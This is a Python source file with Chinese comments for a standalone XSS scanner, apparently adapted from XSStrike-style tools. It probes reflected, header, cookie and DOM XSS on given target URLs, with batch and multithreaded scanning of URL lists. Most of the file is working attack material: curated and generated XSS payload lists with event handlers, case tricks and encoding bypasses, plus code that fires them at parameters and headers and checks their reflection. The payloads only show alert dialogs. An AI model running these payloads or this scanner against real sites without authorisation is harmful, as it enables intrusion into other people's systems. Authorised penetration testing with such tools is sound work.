# -*- coding: utf-8 -*-
"""
XSS 漏洞扫描器（独立版，不依赖 Burp Suite）

移植自 XssFleet 的核心检测算法，支持：
1. 反射型 XSS（参数注入 + 上下文分析 + payload 生成）
2. HTTP Header XSS（Referer / User-Agent / X-Forwarded-For 等）
3. DOM XSS 静态分析（JS sink + source 检测）

用法：
  python xss_scanner_standalone.py -u "http://target.com/search?q=test"
  python xss_scanner_standalone.py -u "http://target.com/search?q=test" -d
  python xss_scanner_standalone.py -f urls.txt -w 5
"""

import requests
import re
import sys
import argparse
import urllib3
import random
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# XSStrike 风格配置
# ============================================================

XSSCHECKER = 'v3dm0s'

tags = ('html', 'd3v', 'a', 'details')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')
lFillings = ('', '%0dx')

eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions = (
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'confirm()',
    '(prompt)``', 'a=prompt,a()')

CURATED_PAYLOADS = [
    ('"><script>alert()</script>', 11, 'html'),
    ('" onmouseover=alert(1) "', 11, 'attribute'),
    ("' onfocus=javascript:alert() '", 11, 'attribute'),
    ('" onfocus=javascript:alert() "', 11, 'attribute'),
    ('"><a href=javascript:alert()>a</a>', 11, 'html'),
    ('"><ScRipt>alert()</ScriPt>', 11, 'html'),
    ('"><SVG ONLOAD=alert()>', 11, 'html'),
    ('"><IMG SRC=x ONERROR=alert()>', 11, 'html'),
    ('"><oonnmouseover=alert(1)>', 10, 'attribute'),
    ('"><scscriptript>alert()</scscriptript>', 10, 'html'),
    ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;', 11, 'url_param'),
    ('" onfocus=javascript:alert() type="text', 11, 'attribute'),
    ('" onmouseover=alert() type="text', 11, 'attribute'),
]

XSSTRIKE_PAYLOADS = (
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confirm()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((prompt))()//',
    '<iMg sRc=x:confirm`` oNlOad=eval(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<img src=x onerror=confirm`1`>',
    '<svg/onload=confirm`1`>',
)

HEADER_XSS_TARGETS = [
    "Referer", "User-Agent", "X-Forwarded-For", "X-Real-IP",
    "X-Originating-IP", "X-Remote-Addr", "X-Client-IP",
    "Client-IP", "True-Client-IP", "X-Forwarded-Host",
]

DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    'eval', 'setTimeout', 'setInterval', 'Function',
    'location.href', 'location.hash', 'location.replace', 'location.assign',
    'document.URL', 'window.open', 'document.cookie',
    'insertAdjacentHTML', 'createContextualFragment'
]

DOM_SOURCES = [
    'location.search', 'location.hash', 'location.href',
    'document.referrer', 'window.name',
    'localStorage.getItem', 'sessionStorage.getItem'
]

_print_lock = threading.Lock()

# ============================================================
# 工具函数
# ============================================================

def print_banner():
    print("""
╔══════════════════════════════════════════════╗
║       XSS Scanner (Standalone)               ║
║       Reflected / Header / DOM XSS           ║
╚══════════════════════════════════════════════╝
""")


def print_vuln(msg):
    with _print_lock:
        print("\033[91m[VULN] %s\033[0m" % msg)


def print_info(msg):
    with _print_lock:
        print("\033[94m[INFO] %s\033[0m" % msg)


def print_ok(msg):
    with _print_lock:
        print("\033[92m[OK] %s\033[0m" % msg)


def safe_request(url, method="GET", headers=None, data=None, timeout=10):
    try:
        if method.upper() == "GET":
            return requests.get(url, headers=headers, data=data,
                                timeout=timeout, verify=False, allow_redirects=False)
        else:
            return requests.post(url, headers=headers, data=data,
                                 timeout=timeout, verify=False, allow_redirects=False)
    except:
        return None


# ============================================================
# 上下文解析（移植自 XssFleet htmlParser）
# ============================================================

def _extract_scripts(html):
    scripts = []
    pattern = r'<script[^>]*>([\s\S]*?)</script>'
    for match in re.finditer(pattern, html, re.IGNORECASE):
        scripts.append(match.group(1))
    return scripts


def _escaped(index, string):
    count = 0
    i = index - 1
    while i >= 0 and string[i] == '\\':
        count += 1
        i -= 1
    return count % 2 == 1


def _is_bad_context(position, non_executable_contexts):
    for ctx in non_executable_contexts:
        if ctx[0] <= position <= ctx[1]:
            return ctx[2]
    return ''


def html_parser(response_text):
    xsschecker = XSSCHECKER
    reflections = response_text.count(xsschecker)
    if reflections == 0:
        return {}

    position_and_context = {}
    environment_details = {}

    clean_response = re.sub(r'<!--[\s\S]*?-->', '', response_text)

    # Script 上下文
    for script in _extract_scripts(clean_response):
        occurences = re.finditer(r'(%s.*?)$' % re.escape(xsschecker), script, re.MULTILINE)
        for occurence in occurences:
            this_position = occurence.start(1)
            position_and_context[this_position] = 'script'
            environment_details[this_position] = {'details': {'quote': ''}}
            for i in range(len(occurence.group())):
                current_char = occurence.group()[i]
                if current_char in ('/', '\'', '`', '"') and not _escaped(i, occurence.group()):
                    environment_details[this_position]['details']['quote'] = current_char
                elif current_char in (')', ']', '}') and not _escaped(i, occurence.group()):
                    break
            clean_response = clean_response.replace(xsschecker, '', 1)

    # Attribute 上下文
    if len(position_and_context) < reflections:
        attribute_context = re.finditer(r'<[^>]*?(%s)[^>]*?>' % re.escape(xsschecker), clean_response)
        for occurence in attribute_context:
            match = occurence.group(0)
            this_position = occurence.start(1)
            parts = re.split(r'\s', match)
            tag = parts[0][1:] if parts else ''
            for part in parts:
                if xsschecker in part:
                    Type = ''
                    quote = ''
                    name = ''
                    value = ''
                    if '=' in part:
                        match_quote = re.search(r"=([\'\"`])?", part)
                        quote = match_quote.group(1) if match_quote and match_quote.group(1) else ''
                        parts_split = part.split('=', 1)
                        name_and_value = (parts_split[0], parts_split[1] if len(parts_split) > 1 else '')
                        Type = 'name' if xsschecker == name_and_value[0] else 'value'
                        name = name_and_value[0]
                        value = name_and_value[1].rstrip('>').rstrip(quote or '').lstrip(quote or '') if name_and_value[1] else ''
                    else:
                        Type = 'flag'
                    position_and_context[this_position] = 'attribute'
                    environment_details[this_position] = {
                        'details': {'tag': tag, 'type': Type, 'quote': quote, 'value': value, 'name': name}
                    }

    # HTML 上下文
    if len(position_and_context) < reflections:
        html_context = re.finditer(re.escape(xsschecker), clean_response)
        for occurence in html_context:
            this_position = occurence.start()
            if this_position not in position_and_context:
                position_and_context[this_position] = 'html'
                environment_details[this_position] = {'details': {}}

    # Comment 上下文
    if len(position_and_context) < reflections:
        comment_context = re.finditer(r'<!--[\s\S]*?(%s)[\s\S]*?-->' % re.escape(xsschecker), response_text)
        for occurence in comment_context:
            this_position = occurence.start(1)
            if this_position not in position_and_context:
                position_and_context[this_position] = 'comment'
                environment_details[this_position] = {'details': {}}

    database = {}
    for i in sorted(position_and_context):
        database[i] = {
            'position': i,
            'context': position_and_context[i],
            'details': environment_details.get(i, {}).get('details', {})
        }

    # badTag 检测
    bad_contexts = re.finditer(
        r'(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[\s\S]*?(%s)[\s\S]*?</\1>' % re.escape(xsschecker),
        response_text
    )
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])

    if non_executable_contexts:
        for key in database.keys():
            position = database[key]['position']
            bad_tag = _is_bad_context(position, non_executable_contexts)
            database[key]['details']['badTag'] = bad_tag if bad_tag else ''

    return database


# ============================================================
# Payload 生成
# ============================================================

def _random_upper(string):
    return ''.join(c.upper() if random.random() > 0.5 else c for c in string)


def _gen_gen(fillings_list, e_fillings, l_fillings, event_handlers, tag_list, func_list, ends, bad_tag=''):
    payloads = set()
    for tag in tag_list:
        if tag == bad_tag:
            continue
        for event in event_handlers:
            if tag in event_handlers[event]:
                for e_filling in e_fillings:
                    for l_filling in l_fillings:
                        for filling in fillings_list:
                            for function in func_list:
                                for end in ends:
                                    payload = '<%s%s%s%s=%s%s%s' % (
                                        tag, filling, event, e_filling, function, l_filling, end)
                                    payloads.add(payload)
    return list(payloads)


def _generate_payloads(occurences, response_text):
    scripts = _extract_scripts(response_text)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}

    for i in occurences:
        context = occurences[i]['context']
        if context == 'html':
            bad_tag = occurences[i]['details'].get('badTag', '')
            payload_list = _gen_gen(fillings, eFillings, lFillings,
                                    eventHandlers, tags, functions, ['//', '>'], bad_tag)
            for payload in payload_list:
                vectors[10].add(payload)
        elif context == 'attribute':
            quote = occurences[i]['details'].get('quote', '')
            payload_list = _gen_gen(fillings, eFillings, lFillings,
                                    eventHandlers, tags, functions, ['//', '>'])
            for payload in payload_list:
                if quote:
                    payload = quote + '>' + payload
                vectors[9].add(payload)
            if quote:
                for f in fillings:
                    for func in functions:
                        vector = '%s%s%s%s=%s%s' % (quote, f, _random_upper('autofocus'), f, _random_upper('onfocus'), func)
                        vectors[8].add(vector)
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            payload_list = _gen_gen(fillings, eFillings, lFillings,
                                    eventHandlers, tags, functions, ['//', '>'])
            for payload in payload_list:
                vectors[10].add(payload)
            index += 1

    for payload, priority, ctx in CURATED_PAYLOADS:
        vectors[priority].add(payload)
    for payload in XSSTRIKE_PAYLOADS:
        vectors[10].add(payload)

    all_payloads = []
    for priority in sorted(vectors.keys(), reverse=True):
        for payload in vectors[priority]:
            if priority >= 8:
                all_payloads.append({'payload': payload, 'priority': priority})
    return all_payloads


def _check_reflection(response_body, payload):
    if payload in response_body:
        return True
    lower = payload.lower()
    if 'onmouseover' in lower or 'onfocus' in lower or 'ontoggle' in lower:
        event_part = payload.split('=')[0] if '=' in payload else payload
        if event_part.lower() in response_body.lower():
            return True
    if '<script' in lower and '<script' in response_body.lower():
        return True
    return False


# ============================================================
# 功能1: 反射型 XSS 扫描
# ============================================================

def scan_reflected_xss(target_url, deep=False, timeout=10):
    print_info("=== 反射型 XSS 扫描 ===")
    print_info("目标: %s" % target_url)

    parsed = urlparse(target_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        print_info("URL 中没有参数，跳过反射型 XSS 扫描")
        return []

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    findings = []

    for param_name in params:
        print_info("测试参数: %s" % param_name)

        # 步骤1: 注入 checker 探测反射点
        test_params = dict(params)
        test_params[param_name] = [XSSCHECKER]
        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()

        resp = safe_request(test_url, headers=base_headers, timeout=timeout)
        if not resp:
            continue

        # 步骤2: 解析上下文
        occurences = html_parser(resp.text)
        if not occurences:
            print_info("  参数 '%s' 无反射点" % param_name)
            continue

        print_info("  发现 %d 个反射点" % len(occurences))

        # 步骤3: 生成 payload
        payloads = _generate_payloads(occurences, resp.text)
        if not payloads:
            continue

        # 限制测试数量
        test_payloads = payloads[:10] if not deep else payloads[:20]
        print_info("  生成 %d 个 payload，测试前 %d 个" % (len(payloads), len(test_payloads)))

        # 步骤4: 测试 payload
        for p in test_payloads:
            payload_str = p['payload']
            test_params[param_name] = [payload_str]
            test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()

            payload_resp = safe_request(test_url, headers=base_headers, timeout=timeout)
            if not payload_resp:
                continue

            if _check_reflection(payload_resp.text, payload_str):
                severity = "高" if p['priority'] >= 10 else "中"
                finding = {
                    "type": "反射型 XSS",
                    "parameter": param_name,
                    "payload": payload_str,
                    "priority": p['priority'],
                    "severity": severity,
                    "url": test_url,
                    "status_code": payload_resp.status_code,
                }
                findings.append(finding)
                print_vuln("参数 '%s' | 优先级: %d | 置信度: %s | payload: %s" % (
                    param_name, p['priority'], severity, payload_str[:80]))
                break  # 该参数发现一个就够了

    if not findings:
        print_ok("反射型 XSS 扫描完成，未发现漏洞")

    return findings


# ============================================================
# 功能2: HTTP Header XSS 扫描
# ============================================================

def scan_header_xss(target_url, timeout=10):
    print_info("=== HTTP Header XSS 扫描 ===")
    print_info("目标: %s" % target_url)

    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    xss_payload = '<script>alert(1)</script>'
    findings = []

    for header_name in HEADER_XSS_TARGETS:
        headers = dict(base_headers)
        headers[header_name] = xss_payload

        resp = safe_request(target_url, headers=headers, timeout=timeout)
        if not resp:
            continue

        if xss_payload in resp.text:
            finding = {
                "type": "Header XSS",
                "header": header_name,
                "payload": xss_payload,
                "severity": "高",
                "url": target_url,
                "status_code": resp.status_code,
            }
            findings.append(finding)
            print_vuln("Header '%s' 反射了 XSS payload" % header_name)

    if not findings:
        print_ok("Header XSS 扫描完成，未发现漏洞")

    return findings


# ============================================================
# 功能3: DOM XSS 静态分析
# ============================================================

def scan_dom_xss(target_url, timeout=10):
    print_info("=== DOM XSS 静态分析 ===")
    print_info("目标: %s" % target_url)

    resp = safe_request(target_url, timeout=timeout)
    if not resp:
        print_info("无法访问目标")
        return []

    scripts = _extract_scripts(resp.text)
    if not scripts:
        print_info("未发现 JavaScript 代码")
        return []

    found_sinks = []
    found_sources = []

    for script in scripts:
        for sink in DOM_SINKS:
            if sink in script:
                found_sinks.append(sink)
        for source in DOM_SOURCES:
            if source in script:
                found_sources.append(source)

    unique_sinks = list(set(found_sinks))
    unique_sources = list(set(found_sources))

    findings = []
    if unique_sinks and unique_sources:
        finding = {
            "type": "DOM XSS 潜在风险",
            "sinks": unique_sinks,
            "sources": unique_sources,
            "severity": "信息",
            "url": target_url,
        }
        findings.append(finding)
        print_vuln("发现 DOM XSS 特征:")
        print("    Sinks: %s" % ', '.join(unique_sinks))
        print("    Sources: %s" % ', '.join(unique_sources))
    else:
        print_ok("DOM XSS 分析完成，未发现 sink+source 组合")

    return findings


# ============================================================
# 功能4: Cookie 反射 XSS
# ============================================================

def scan_cookie_xss(target_url, timeout=10):
    print_info("=== Cookie 反射 XSS 扫描 ===")
    print_info("目标: %s" % target_url)

    xss_payload = '<script>alert(1)</script>'
    cookie_name = 't_sort'
    cookie_value = '%s=%s' % (cookie_name, xss_payload)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": cookie_value,
    }

    resp = safe_request(target_url, headers=headers, timeout=timeout)
    if not resp:
        print_info("无法访问目标")
        return []

    findings = []
    if cookie_name in resp.text:
        finding = {
            "type": "Cookie 反射 XSS",
            "parameter": "Cookie: %s" % cookie_name,
            "payload": xss_payload,
            "severity": "高",
            "url": target_url,
            "status_code": resp.status_code,
        }
        findings.append(finding)
        print_vuln("Cookie '%s' 被反射到响应中" % cookie_name)
    else:
        print_ok("Cookie 反射扫描完成，未发现漏洞")

    return findings


# ============================================================
# 功能5: 批量扫描
# ============================================================

def _scan_single_url(url, deep, timeout):
    findings = []
    f = scan_reflected_xss(url, deep=deep, timeout=timeout)
    findings.extend(f)
    f = scan_header_xss(url, timeout=timeout)
    findings.extend(f)
    f = scan_cookie_xss(url, timeout=timeout)
    findings.extend(f)
    if deep:
        f = scan_dom_xss(url, timeout=timeout)
        findings.extend(f)
    return findings


def scan_from_file(url_file, deep=False, workers=1, timeout=10):
    print_info("从文件读取 URL: %s" % url_file)

    try:
        with open(url_file, "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as e:
        print_info("读取文件失败: %s" % str(e))
        return

    print_info("共 %d 个 URL，并发数: %d" % (len(urls), workers))

    all_findings = []

    if workers <= 1:
        for i, url in enumerate(urls, 1):
            print("\n" + "=" * 50)
            print_info("[%d/%d] %s" % (i, len(urls), url))
            findings = _scan_single_url(url, deep, timeout)
            all_findings.extend(findings)
    else:
        completed = [0]
        total = len(urls)

        def _worker(url):
            findings = _scan_single_url(url, deep, timeout)
            with _print_lock:
                completed[0] += 1
                print_info("进度: %d/%d 完成 - %s" % (completed[0], total, url))
            return findings

        with ThreadPoolExecutor(max_workers=workers) as executor:
            future_to_url = {executor.submit(_worker, url): url for url in urls}
            for future in as_completed(future_to_url):
                try:
                    findings = future.result()
                    all_findings.extend(findings)
                except Exception as e:
                    url = future_to_url[future]
                    print_info("扫描 %s 出错: %s" % (url, str(e)))

    print("\n" + "=" * 50)
    print_info("=== 扫描汇总 ===")
    print_info("扫描 URL 数: %d" % len(urls))
    print_info("发现潜在漏洞: %d" % len(all_findings))

    if all_findings:
        print("\n发现的漏洞:")
        for i, f in enumerate(all_findings, 1):
            if 'parameter' in f:
                print("  %d. [%s] 参数 '%s' | 严重性: %s | payload: %s" % (
                    i, f['type'], f['parameter'], f['severity'], f['payload'][:60]))
            elif 'header' in f:
                print("  %d. [%s] Header '%s' | 严重性: %s" % (
                    i, f['type'], f['header'], f['severity']))
            elif 'sinks' in f:
                print("  %d. [%s] Sinks: %s | Sources: %s" % (
                    i, f['type'], ', '.join(f['sinks']), ', '.join(f['sources'])))

    return all_findings


# ============================================================
# 主入口
# ============================================================

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="XSS 漏洞扫描器（反射型 / Header / DOM XSS）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  %(prog)s -u "http://target.com/search?q=test"              # 反射型 XSS
  %(prog)s -u "http://target.com/search?q=test" -d           # 深度扫描（含 DOM XSS）
  %(prog)s -u "http://target.com" --header-scan              # Header XSS
  %(prog)s -u "http://target.com" --cookie-scan              # Cookie 反射
  %(prog)s -f urls.txt -w 5                                  # 批量扫描
        """
    )

    parser.add_argument("-u", "--url", help="目标 URL")
    parser.add_argument("-f", "--file", help="URL 列表文件（每行一个 URL）")
    parser.add_argument("-d", "--deep", action="store_true", help="深度扫描（含 DOM XSS 分析）")
    parser.add_argument("--header-scan", action="store_true", help="只扫描 Header XSS")
    parser.add_argument("--cookie-scan", action="store_true", help="只扫描 Cookie 反射 XSS")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时时间（秒）")
    parser.add_argument("-w", "--workers", type=int, default=1, help="并行线程数（默认 1）")

    args = parser.parse_args()

    # 批量扫描
    if args.file:
        scan_from_file(args.file, args.deep, args.workers, args.timeout)
        return

    if not args.url:
        parser.print_help()
        return

    target_url = args.url

    # 指定模式
    if args.header_scan:
        scan_header_xss(target_url, args.timeout)
        return

    if args.cookie_scan:
        scan_cookie_xss(target_url, args.timeout)
        return

    # 全量扫描
    scan_reflected_xss(target_url, args.deep, args.timeout)
    scan_header_xss(target_url, args.timeout)
    scan_cookie_xss(target_url, args.timeout)
    if args.deep:
        scan_dom_xss(target_url, args.timeout)


if __name__ == "__main__":
    main()
